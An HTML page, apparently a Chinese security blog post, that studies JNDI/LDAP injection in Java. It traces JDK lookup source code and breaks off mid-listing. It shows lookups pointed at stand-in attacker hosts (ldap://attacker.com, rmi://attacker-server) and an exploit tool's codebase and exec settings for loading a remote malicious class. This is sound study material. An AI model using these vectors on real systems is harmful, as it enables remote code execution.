@@ -1,0 +1,2836 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Sariel.D">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Sariel.D">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="反序列化漏洞是直接进行RCE，基于JNDI的反序列化利用是Java代码注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JNDI&#x2F;LADP 学习">
+<meta property="og:url" content="https://blog.sari3l.com/posts/469de5e6/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="反序列化漏洞是直接进行RCE，基于JNDI的反序列化利用是Java代码注入">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="article:published_time" content="2019-03-10T06:14:15.000Z">
+<meta property="article:modified_time" content="2020-07-06T09:53:51.640Z">
+<meta property="article:author" content="Sariel.D">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <link rel="alternate" href="/atom.xml" title="Learning Man&#39;s Blog" type="application/atom+xml">
+    
+    <title>JNDI/LADP 学习 · Learning Man</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io@latest/css/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io@latest/scripts/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+    <script>
+        (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+        (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date(); a = s.createElement(o),
+        m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+        ga('create', 'UA-129685149-2', 'auto');
+        ga('send', 'pageview');
+    </script>
+    
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-funky.css" type="text/css"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Learning Man&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">JNDI/LADP 学习</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Learning Man's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            JNDI/LADP 学习
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">4.3k</span>阅读时长: <span class="post-count reading-time">20 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/03/10</span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <!--<img class="loading" src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/images/loading.gif" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        -->
+        <img class="loading" src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>Remote Method Invocation 是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。<strong>在RMI中对象是通过序列化方式进行编码传输的。</strong></p>
+<h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>JNDI即Java Naming and Directory Interface，翻译成中文就Java命令和目录接口，2016年的blackhat大会上web议题重点讲到，JNDI提供了很多实现方式，主要有RMI，LDAP，CORBA等。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/469de5e6/15523811246162.jpg" alt></p>
+<p>JNDI提供了一个统一的外部接口，底层SPI则是多样的。在使用JNDIReferences的时候可以远程加载外部的对象，即实现factory的初始化。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/469de5e6/15523687542752.jpg" alt></p>
+<p>远程类文件读取设置</p>
+<table>
+<thead>
+<tr>
+<th align="left">Provider</th>
+<th align="left">Property to enable remote class loading</th>
+<th align="center">Security Manager enforcement</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">RMI</td>
+<td align="left">java.rmi.server.useCodebaseOnly = false <br> (default value = true since JDK 7u21)</td>
+<td align="center">Always</td>
+</tr>
+<tr>
+<td align="left">LDAP</td>
+<td align="left">com.sun.jndi.ldap.object.trustURLCodebase = true <br> (default value = false)</td>
+<td align="center">Not enforced</td>
+</tr>
+<tr>
+<td align="left">CORBA</td>
+<td align="left"></td>
+<td align="center">Always</td>
+</tr>
+</tbody></table>
+<h3 id="codebase"><a href="#codebase" class="headerlink" title="codebase"></a>codebase</h3><ul>
+<li>exploit.jndiUrl, defaults to ldap://localhost:1389/obj</li>
+<li>exploit.codebase, defaults to <a href="http://localhost:8080/" target="_blank" rel="noopener">http://localhost:8080/</a></li>
+<li>exploit.codebaseClass, defaults to Exploit</li>
+<li>exploit.exec, defaults to /usr/bin/gedit</li>
+</ul>
+<ol>
+<li>exploit.jndiUrl的意思，攻击者要传递的jndi地址，比如rmi的，ldap的。</li>
+<li>exploit.codebase的意思，攻击者提供的http服务器，提供下载远程class的地址。</li>
+<li>exploit.codebaseClass的意思，攻击者在http服务器提供下载类的名称。默认的名称为Exploit，因此生成的poc的就会访问 <a href="http://localhost:8080/Exploit.class" target="_blank" rel="noopener">http://localhost:8080/Exploit.class</a></li>
+<li>exploit.exec的意思，攻击者执行的恶意命令</li>
+</ol>
+<h3 id="动态协议转换"><a href="#动态协议转换" class="headerlink" title="动态协议转换"></a>动态协议转换</h3><p>在初始化配置 JNDI 设置时可以预先指定其上下文环境（RMI、LDAP 或者 CORBA 等）：</p>
+<pre class=" language-java"><code class="language-java">Properties env <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>Context<span class="token punctuation">.</span>INITIAL_CONTEXT_FACTORY<span class="token punctuation">,</span> <span class="token string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>Context<span class="token punctuation">.</span>PROVIDER_URL<span class="token punctuation">,</span> <span class="token string">"rmi://localhost:1099"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+Context ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>而在调用<code>lookup()</code>或者<code>search()</code>时，可以使用带 URI 动态的转换上下文环境，例如上面已经设置了当前上下文会访问 RMI 服务，那么可以直接使用 LDAP 的 URI 格式去转换上下文环境访问 LDAP 服务上的绑定对象：</p>
+<pre class=" language-java"><code class="language-java">ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>之所以InitialContext.lookup()函数允许我们通过使用<code>绝对地址</code>来实现<strong>动态转换</strong><code>协议</code>和<code>地址</code></p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> Object <span class="token function">lookup</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token keyword">throws</span> NamingException <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token function">getURLOrDefaultInitCtx</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>getURLOrDefaultInitCtx()函数返回一个基于提供的 URL 协议解析的或 DefaultInitCtx 的上下文(通过修改 URL 即可不必修改协议保持默认使用的协议，仍可指向我们自己的服务器)</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">protected</span> Context <span class="token function">getURLOrDefaultInitCtx</span><span class="token punctuation">(</span>Name paramName<span class="token punctuation">)</span> <span class="token keyword">throws</span> NamingException <span class="token punctuation">{</span>
+
+    <span class="token comment" spellcheck="true">// 修改 URL 或者协议使其*需重新生成上下文*，跳过此判断</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>NamingManager<span class="token punctuation">.</span><span class="token function">hasInitialContextFactoryBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token function">getDefaultInitCtx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>paramName<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        String str1 <span class="token operator">=</span> paramName<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        String str2 <span class="token operator">=</span> <span class="token function">getURLScheme</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 解析 URL 协议</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>str2 <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token comment" spellcheck="true">// 如果存在指定的 URL 协议，则尝试获取对应的上下文环境</span>
+            Context localContext <span class="token operator">=</span> NamingManager<span class="token punctuation">.</span><span class="token function">getURLContext</span><span class="token punctuation">(</span>str2<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>myProps<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>localContext <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">return</span> localContext<span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">return</span> <span class="token function">getDefaultInitCtx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>举个例子：即使 Context.PROVIDER_URL 已被设定为一个可控的本地服务器地址，文件名采用相对路径(eg. “foo”实际为”rmi://secure-server:1099/foo”)，攻击者可通过控制lookup中的参数值为绝对路径，覆盖默认的 Context.PROVIDER_URL 来指向攻击者控制的服务器</p>
+<pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// Create the initial context</span>
+Hashtable env <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>Context<span class="token punctuation">.</span>INITIAL_CONTEXT_FACTORY<span class="token punctuation">,</span> <span class="token string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>Context<span class="token punctuation">.</span>PROVIDER_URL<span class="token punctuation">,</span> <span class="token string">"rmi://secure-server:1099"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+Context ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">// Look up in the local RMI registry</span>
+Object local_obj <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token operator">&lt;</span>attacker controlled<span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>虽然服务器预期类似于名为”foo”的相对路径调用，攻击者可通过提供绝对路径指向一个完全不同的 RMI 注册表，或使用不同的协议来覆盖 Context.INITIAL_CONTEXT_FACTORY 选项</p>
+<ul>
+<li>rmi://attacker-server/bar</li>
+<li>ldap://attacker-server/cn=bar,dc=test,dc=org</li>
+<li>iiop://attacker-server/bar</li>
+</ul>
+<h3 id="lookup-函数"><a href="#lookup-函数" class="headerlink" title="lookup 函数"></a>lookup 函数</h3><p>以传入绝对路径为例</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Context<span class="token punctuation">;</span>
+<span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>InitialContext<span class="token punctuation">;</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JNDIClientTest</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
+        String uri <span class="token operator">=</span> <span class="token string">"rmi://localhost:1097/Object"</span><span class="token punctuation">;</span>
+        Context ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<p>调用链</p>
+<pre class=" language-plain"><code class="language-plain">lookup:114, RegistryContext (com.sun.jndi.rmi.registry)
+lookup:203, GenericURLContext (com.sun.jndi.toolkit.url)
+lookup:411, InitialContext (javax.naming)
+main:7, JNDIClientTest</code></pre>
+<p>关键代码，var2为通过ReferenceWrapper_Stub获取到的包装类，最后调用decodeObject</p>
+<pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// com.sun.jndi.rmi.registry.RegistryContext#lookup(javax.naming.Name)</span>
+<span class="token keyword">public</span> Object <span class="token function">lookup</span><span class="token punctuation">(</span>Name var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> NamingException <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">RegistryContext</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        Remote var2<span class="token punctuation">;</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>registry<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// RegistryImpl_Stub[UnicastRef [liveRef: [endpoint:[127.0.0.1:1099](remote),objID:[0:0:0, 0]]]]</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NotBoundException</span> var4<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">decodeObject</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var1<span class="token punctuation">.</span><span class="token function">getPrefix</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// Here</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<p>跟入decodeObject，调用var1的getReference函数获取wrappee属性值</p>
+<pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// com.sun.jndi.rmi.registry.RegistryContext#decodeObject</span>
+<span class="token keyword">private</span> Object <span class="token function">decodeObject</span><span class="token punctuation">(</span>Remote var1<span class="token punctuation">,</span> Name var2<span class="token punctuation">)</span> <span class="token keyword">throws</span> NamingException <span class="token punctuation">{</span>
+    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+        Object var3 <span class="token operator">=</span> var1 <span class="token keyword">instanceof</span> <span class="token class-name">RemoteReference</span> <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>RemoteReference<span class="token punctuation">)</span>var1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getReference</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> var1<span class="token punctuation">;</span>
+        <span class="token keyword">return</span> NamingManager<span class="token punctuation">.</span><span class="token function">getObjectInstance</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>environment<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token punctuation">}</span></code></pre>
+<p>跟入getObjectInstance，ref.getFactoryClassName获取目标类名，带入getObjectFactoryFromReference准备获取目标工厂类实例</p>
+<pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// javax.naming.spi.NamingManager#getObjectInstance</span>
+<span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">getObjectInstance</span><span class="token punctuation">(</span>Object refInfo<span class="token punctuation">,</span> Name name<span class="token punctuation">,</span> Context nameCtx<span class="token punctuation">,</span> Hashtable<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token operator">></span> environment<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception
+<span class="token punctuation">{</span>
+
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+    <span class="token comment" spellcheck="true">// Use reference if possible</span>
+    Reference ref <span class="token operator">=</span> null<span class="token punctuation">;</span>
